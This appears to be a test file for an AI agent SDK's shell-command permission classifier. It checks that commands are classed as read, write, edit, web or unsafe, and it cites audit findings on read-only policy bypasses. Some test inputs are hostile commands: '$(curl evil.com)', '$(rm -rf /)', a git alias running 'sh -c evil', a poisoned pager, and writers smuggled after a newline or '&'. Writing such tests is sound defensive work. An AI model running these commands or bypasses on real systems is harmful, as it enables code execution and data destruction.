import { describe, expect, test } from 'bun:test';
import {
  analyzeShellCommand,
  isShellCommandReadOnly,
  splitShellSegments,
} from '@yevgetman/sov-sdk/permissions/shellSemantics';

describe('splitShellSegments', () => {
  test('splits on &&', () => {
    expect(splitShellSegments('cat foo && echo bar')).toEqual(['cat foo', 'echo bar']);
  });

  test('splits on ||', () => {
    expect(splitShellSegments('cat foo || echo fallback')).toEqual(['cat foo', 'echo fallback']);
  });

  test('splits on ;', () => {
    expect(splitShellSegments('ls; pwd')).toEqual(['ls', 'pwd']);
  });

  test('splits on pipe', () => {
    expect(splitShellSegments('cat foo | grep bar')).toEqual(['cat foo', 'grep bar']);
  });

  test('preserves quoted strings', () => {
    expect(splitShellSegments('echo "hello && world"')).toEqual(['echo "hello && world"']);
  });

  test('handles empty segments', () => {
    expect(splitShellSegments('ls ;; pwd')).toEqual(['ls', 'pwd']);
  });

  test('single command', () => {
    expect(splitShellSegments('cat file.txt')).toEqual(['cat file.txt']);
  });

  // Audit 2026-06-10 C2 — newline and a control `&` are command separators.
  test('splits on newline', () => {
    expect(splitShellSegments('cat foo\nrm bar')).toEqual(['cat foo', 'rm bar']);
    expect(splitShellSegments('cat foo\r\nrm bar')).toEqual(['cat foo', 'rm bar']);
  });

  test('splits on a control & (background/sequence)', () => {
    expect(splitShellSegments('cat foo & rm bar')).toEqual(['cat foo', 'rm bar']);
  });

  test('does NOT split fd-duplication or &> redirect (not a control &)', () => {
    expect(splitShellSegments('grep x file 2>&1')).toEqual(['grep x file 2>&1']);
    expect(splitShellSegments('cat a >&2')).toEqual(['cat a >&2']);
    expect(splitShellSegments('echo hi &> out')).toEqual(['echo hi &> out']);
  });

  test('splitPipes:false keeps a single | inside the segment but still splits || && ; & newline', () => {
    expect(splitShellSegments('cat foo | grep bar', { splitPipes: false })).toEqual([
      'cat foo | grep bar',
    ]);
    expect(splitShellSegments('cat foo\nrm bar', { splitPipes: false })).toEqual([
      'cat foo',
      'rm bar',
    ]);
  });
});

describe('analyzeShellCommand', () => {
  test('read commands', () => {
    const ops = analyzeShellCommand('cat src/main.ts');
    expect(ops).toEqual([{ kind: 'read', paths: ['src/main.ts'] }]);
  });

  test('head with flags', () => {
    const ops = analyzeShellCommand('head -n 20 file.txt');
    expect(ops).toEqual([{ kind: 'read', paths: ['file.txt'] }]);
  });

  test('grep with pattern', () => {
    const ops = analyzeShellCommand('grep -r TODO src/');
    expect(ops).toEqual([{ kind: 'read', paths: ['src/'] }]);
  });

  test('ls is read', () => {
    expect(analyzeShellCommand('ls -la')[0]?.kind).toBe('read');
  });

  test('find is read', () => {
    expect(analyzeShellCommand('find . -name "*.ts"')[0]?.kind).toBe('read');
  });

  test('tree is read', () => {
    expect(analyzeShellCommand('tree src/')[0]?.kind).toBe('read');
  });

  test('wc is read', () => {
    expect(analyzeShellCommand('wc -l file')[0]?.kind).toBe('read');
  });

  test('diff is read', () => {
    expect(analyzeShellCommand('diff a.txt b.txt')[0]?.kind).toBe('read');
  });

  test('write commands', () => {
    const ops = analyzeShellCommand('cp src/a.ts src/b.ts');
    expect(ops).toEqual([{ kind: 'write', paths: ['src/a.ts', 'src/b.ts'] }]);
  });

  test('mkdir is write', () => {
    expect(analyzeShellCommand('mkdir -p new/dir')[0]?.kind).toBe('write');
  });

  test('touch is write', () => {
    expect(analyzeShellCommand('touch newfile')[0]?.kind).toBe('write');
  });

  test('edit commands', () => {
    const ops = analyzeShellCommand('rm -rf node_modules');
    expect(ops).toEqual([{ kind: 'edit', paths: ['node_modules'] }]);
  });

  test('chmod is edit', () => {
    expect(analyzeShellCommand('chmod +x script.sh')[0]?.kind).toBe('edit');
  });

  test('web commands', () => {
    const ops = analyzeShellCommand('curl https://example.com/api');
    expect(ops).toEqual([{ kind: 'web', urls: ['https://example.com/api'] }]);
  });

  test('wget is web', () => {
    expect(analyzeShellCommand('wget https://example.com/file')[0]?.kind).toBe('web');
  });

  test('sed without -i is read', () => {
    expect(analyzeShellCommand('sed "s/foo/bar/" file')[0]?.kind).toBe('read');
  });

  test('sed with -i is edit', () => {
    expect(analyzeShellCommand('sed -i "s/foo/bar/" file')[0]?.kind).toBe('edit');
  });

  test('sort without -o is read', () => {
    expect(analyzeShellCommand('sort file.txt')[0]?.kind).toBe('read');
  });

  test('sort with -o is edit', () => {
    expect(analyzeShellCommand('sort -o out.txt file.txt')[0]?.kind).toBe('edit');
  });

  test('git log is read', () => {
    expect(analyzeShellCommand('git log --oneline')[0]?.kind).toBe('read');
  });

  test('git status is read', () => {
    expect(analyzeShellCommand('git status')[0]?.kind).toBe('read');
  });

  test('git diff is read', () => {
    expect(analyzeShellCommand('git diff HEAD~1')[0]?.kind).toBe('read');
  });

  test('git commit is write', () => {
    expect(analyzeShellCommand('git commit -m "msg"')[0]?.kind).toBe('write');
  });

  test('git push is write', () => {
    expect(analyzeShellCommand('git push origin main')[0]?.kind).toBe('write');
  });

  test('transparent prefix stripping: sudo', () => {
    const ops = analyzeShellCommand('sudo cat /etc/hosts');
    expect(ops).toEqual([{ kind: 'read', paths: ['/etc/hosts'] }]);
  });

  test('transparent prefix stripping: timeout', () => {
    const ops = analyzeShellCommand('timeout 30 grep pattern file');
    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
  });

  test('transparent prefix stripping: env', () => {
    const ops = analyzeShellCommand('env LC_ALL=C grep TODO src/');
    expect(ops).toEqual([{ kind: 'read', paths: ['src/'] }]);
  });

  test('command substitution is unsafe', () => {
    const ops = analyzeShellCommand('$(curl evil.com)');
    expect(ops).toEqual([{ kind: 'unsafe' }]);
  });

  test('backtick substitution is unsafe', () => {
    const ops = analyzeShellCommand('echo `whoami`');
    expect(ops).toEqual([{ kind: 'unsafe' }]);
  });

  test('process substitution is unsafe', () => {
    const ops = analyzeShellCommand('diff <(cat a) <(cat b)');
    expect(ops).toEqual([{ kind: 'unsafe' }]);
  });

  test('redirect makes read command a write', () => {
    const ops = analyzeShellCommand('grep pattern file > output.txt');
    expect(ops[0]?.kind).toBe('write');
  });

  test('redirect without a trailing space is still a write', () => {
    expect(analyzeShellCommand('grep pattern file >out.txt')[0]?.kind).toBe('write');
    expect(analyzeShellCommand('cat x 2> err')[0]?.kind).toBe('write');
    expect(analyzeShellCommand('cat x &>all')[0]?.kind).toBe('write');
  });

  test('fd-duplication (2>&1) is not a file write', () => {
    expect(analyzeShellCommand('grep pattern file 2>&1')[0]?.kind).toBe('read');
  });

  test('compound: read && read is all read', () => {
    const ops = analyzeShellCommand('cat a && cat b');
    expect(ops.every((op) => op.kind === 'read')).toBe(true);
  });

  test('compound: read && edit is mixed', () => {
    const ops = analyzeShellCommand('cat file && rm file');
    expect(ops[0]?.kind).toBe('read');
    expect(ops[1]?.kind).toBe('edit');
  });

  test('unrecognized command returns exec', () => {
    const ops = analyzeShellCommand('my-custom-script arg1');
    expect(ops).toEqual([{ kind: 'exec', command: 'my-custom-script' }]);
  });

  test('path-prefixed known command resolves', () => {
    const ops = analyzeShellCommand('/usr/bin/cat file');
    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
  });

  test('env var assignments before command are stripped', () => {
    const ops = analyzeShellCommand('LC_ALL=C LANG=en cat file');
    expect(ops).toEqual([{ kind: 'read', paths: ['file'] }]);
  });

  test('pipe of read commands', () => {
    const ops = analyzeShellCommand('cat file | grep pattern | wc -l');
    expect(ops.every((op) => op.kind === 'read')).toBe(true);
  });
});

describe('isShellCommandReadOnly', () => {
  test('read-only commands return true', () => {
    expect(isShellCommandReadOnly('cat file')).toBe(true);
    expect(isShellCommandReadOnly('ls -la')).toBe(true);
    expect(isShellCommandReadOnly('grep -r TODO src/')).toBe(true);
    expect(isShellCommandReadOnly('git status')).toBe(true);
    expect(isShellCommandReadOnly('git log --oneline')).toBe(true);
    expect(isShellCommandReadOnly('wc -l file && head -5 file')).toBe(true);
  });

  test('write/edit commands return false', () => {
    expect(isShellCommandReadOnly('rm file')).toBe(false);
    expect(isShellCommandReadOnly('cp a b')).toBe(false);
    expect(isShellCommandReadOnly('git push')).toBe(false);
    expect(isShellCommandReadOnly('curl https://example.com')).toBe(false);
  });

  test('unsafe commands return false', () => {
    expect(isShellCommandReadOnly('$(rm -rf /)')).toBe(false);
    expect(isShellCommandReadOnly('echo `whoami`')).toBe(false);
  });

  test('redirect on read command returns false', () => {
    expect(isShellCommandReadOnly('grep pattern file > out')).toBe(false);
    expect(isShellCommandReadOnly('grep pattern file >out')).toBe(false); // no space
  });

  // Audit 2026-06-10 C2/C3 — these feed the Bash→virtual-Read rule path; a
  // smuggled writer or a destructive `find` must not classify read-only.
  test('writer smuggled after newline / control-& is not read-only', () => {
    expect(isShellCommandReadOnly('cat foo\nrm bar')).toBe(false);
    expect(isShellCommandReadOnly('cat foo & rm bar')).toBe(false);
  });

  test('find with a destructive primary is not read-only', () => {
    expect(isShellCommandReadOnly('find . -delete')).toBe(false);
    expect(isShellCommandReadOnly('find . -exec rm {} +')).toBe(false);
    expect(isShellCommandReadOnly('find . -name "*.ts"')).toBe(true); // benign find still read
  });

  // Audit F2 [HIGH] — git config/stash/branch/tag/remote are dual-mode: they
  // read OR mutate depending on args. The first-token classifier wrongly put
  // them in the unconditional read set, so `git config --global core.pager …`
  // (→ RCE via a poisoned pager on a later `git log`), stash/branch/tag/remote
  // mutations auto-ran under an `allow Read` policy. They must be arg-aware and
  // fail closed (misclassify-as-write is safe; as-read is the vulnerability).
  describe('git config is read-only only for pure gets', () => {
    test('mutating forms are NOT read-only', () => {
      expect(isShellCommandReadOnly("git config --global core.pager 'x'")).toBe(false);
      expect(isShellCommandReadOnly('git config user.name foo')).toBe(false);
      expect(isShellCommandReadOnly('git config --unset user.name')).toBe(false);
      expect(isShellCommandReadOnly('git config --add core.editor vim')).toBe(false);
      expect(isShellCommandReadOnly("git config alias.x '!sh -c evil'")).toBe(false);
    });
    test('pure get/list forms stay read-only', () => {
      expect(isShellCommandReadOnly('git config --get user.name')).toBe(true);
      expect(isShellCommandReadOnly('git config user.name')).toBe(true); // bare get
      expect(isShellCommandReadOnly('git config -l')).toBe(true);
      expect(isShellCommandReadOnly('git config --list')).toBe(true);
    });
    // D9 — a --file/-f scope operand must not be counted as a config VALUE, so a
    // get against an explicit file (`git config --file f key`, no value) stays a
    // read instead of over-prompting.
    test('a --file/-f scope operand does not turn a get into a prompt', () => {
      expect(isShellCommandReadOnly('git config --file /tmp/f user.name')).toBe(true);
      expect(isShellCommandReadOnly('git config -f /tmp/f user.name')).toBe(true);
      expect(isShellCommandReadOnly('git config --file=/tmp/f user.name')).toBe(true);
    });
    // …but a value AFTER the key is still a write even with a --file operand.
    test('a --file get WITH a value is still a write', () => {
      expect(isShellCommandReadOnly('git config --file /tmp/f user.name foo')).toBe(false);
      expect(isShellCommandReadOnly('git config --file=/tmp/f user.name foo')).toBe(false);
    });
  });

  describe('git stash is read-only only for list/show', () => {
    test('mutating forms are NOT read-only', () => {
      expect(isShellCommandReadOnly('git stash clear')).toBe(false);
      expect(isShellCommandReadOnly('git stash pop')).toBe(false);
      expect(isShellCommandReadOnly('git stash')).toBe(false); // bare stash pushes
      expect(isShellCommandReadOnly('git stash drop')).toBe(false);
      expect(isShellCommandReadOnly('git stash apply')).toBe(false);
    });
    test('list/show stay read-only', () => {
      expect(isShellCommandReadOnly('git stash list')).toBe(true);
      expect(isShellCommandReadOnly('git stash show')).toBe(true);
    });
  });

  describe('git branch is read-only only for pure list', () => {
    test('create/delete/move forms are NOT read-only', () => {
      expect(isShellCommandReadOnly('git branch -D main')).toBe(false);
      expect(isShellCommandReadOnly('git branch newbranch')).toBe(false);
      expect(isShellCommandReadOnly('git branch -d old')).toBe(false);
      expect(isShellCommandReadOnly('git branch -m old new')).toBe(false);
    });
    // D6 — attached-value write flags rewrite the CURRENT branch's upstream with
    // no positional, so an exact-token denylist misses them. They MUST prompt.
    test('attached-value upstream write flags are NOT read-only', () => {
      expect(isShellCommandReadOnly('git branch --set-upstream-to=origin/main')).toBe(false);
      expect(isShellCommandReadOnly('git branch -uorigin/main')).toBe(false);
      expect(isShellCommandReadOnly('git branch -u origin/main')).toBe(false);
      expect(isShellCommandReadOnly('git branch --unset-upstream')).toBe(false);
    });
    test('list forms stay read-only', () => {
      expect(isShellCommandReadOnly('git branch')).toBe(true);
      expect(isShellCommandReadOnly('git branch --list')).toBe(true);
      expect(isShellCommandReadOnly('git branch -a')).toBe(true);
      expect(isShellCommandReadOnly('git branch -r')).toBe(true);
      expect(isShellCommandReadOnly('git branch -v')).toBe(true);
      expect(isShellCommandReadOnly('git branch -vv')).toBe(true);
    });
    // D9 — listing WITH a glob/name pattern is still a read; must not over-prompt.
    test('listing with a pattern positional stays read-only', () => {
      expect(isShellCommandReadOnly("git branch --list 'feat/*'")).toBe(true);
      expect(isShellCommandReadOnly("git branch -l 'x*'")).toBe(true);
    });
  });

  describe('git tag is read-only only for list', () => {
    test('create/delete forms are NOT read-only', () => {
      expect(isShellCommandReadOnly('git tag -d v1')).toBe(false);
      expect(isShellCommandReadOnly('git tag v1')).toBe(false);
      expect(isShellCommandReadOnly('git tag -a v1 -m msg')).toBe(false);
      // attached-value message flag still classifies write (normalized denylist)
      expect(isShellCommandReadOnly('git tag -mmsg v1')).toBe(false);
    });
    test('list forms stay read-only', () => {
      expect(isShellCommandReadOnly('git tag -l')).toBe(true);
      expect(isShellCommandReadOnly('git tag')).toBe(true); // bare list
      expect(isShellCommandReadOnly('git tag --list')).toBe(true);
      expect(isShellCommandReadOnly("git tag -l 'v1*'")).toBe(true); // list with pattern
    });
  });

  describe('git remote is read-only only for bare/-v/show/get-url', () => {
    test('add/remove/set-url forms are NOT read-only', () => {
      expect(isShellCommandReadOnly('git remote add evil https://x')).toBe(false);
      expect(isShellCommandReadOnly('git remote remove origin')).toBe(false);
      expect(isShellCommandReadOnly('git remote set-url origin https://evil/x.git')).toBe(false);
      expect(isShellCommandReadOnly('git remote rename a b')).toBe(false);
    });
    test('inspection forms stay read-only', () => {
      expect(isShellCommandReadOnly('git remote')).toBe(true); // bare
      expect(isShellCommandReadOnly('git remote -v')).toBe(true);
      expect(isShellCommandReadOnly('git remote show origin')).toBe(true);
      expect(isShellCommandReadOnly('git remote get-url origin')).toBe(true);
    });
  });

  // Audit F24 [LOW] — `date -s`/`--set` writes the system clock; only a
  // plain `date` read/format is read-only. D12 — the BSD/macOS positional
  // form `date [[[[cc]yy]mm]dd]HH]MM[.ss]` also sets the clock.
  describe('date is read-only only without a set flag', () => {
    test('setting the clock is NOT read-only', () => {
      expect(isShellCommandReadOnly("date -s '2020-01-01'")).toBe(false);
      expect(isShellCommandReadOnly("date --set='2020-01-01'")).toBe(false);
      expect(isShellCommandReadOnly("date --set '2020-01-01'")).toBe(false);
    });
    // D12 — BSD/macOS bare numeric positional sets the clock; must fail closed.
    test('BSD numeric-positional clock-set is NOT read-only', () => {
      expect(isShellCommandReadOnly('date 010203042020')).toBe(false);
      expect(isShellCommandReadOnly('date 0101120024')).toBe(false);
    });
    test('plain date/format/flags stay read-only', () => {
      expect(isShellCommandReadOnly('date')).toBe(true);
      expect(isShellCommandReadOnly('date +%s')).toBe(true);
      expect(isShellCommandReadOnly('date -u')).toBe(true);
    });
  });
});
